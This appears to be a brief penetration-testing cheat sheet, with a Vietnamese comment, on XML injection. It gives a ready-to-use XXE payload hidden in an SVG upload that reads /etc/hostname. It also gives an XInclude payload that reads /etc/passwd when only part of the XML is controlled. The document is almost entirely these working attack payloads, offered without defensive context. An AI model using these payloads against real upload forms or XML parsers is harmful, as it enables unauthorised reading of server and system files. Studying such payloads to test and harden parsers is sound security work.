# XXE attacks via file upload (.svg)
```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

# XInclude attacks
Khi ta chỉ kiểm soát được 1 phần của xml document(không declared được doctype)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
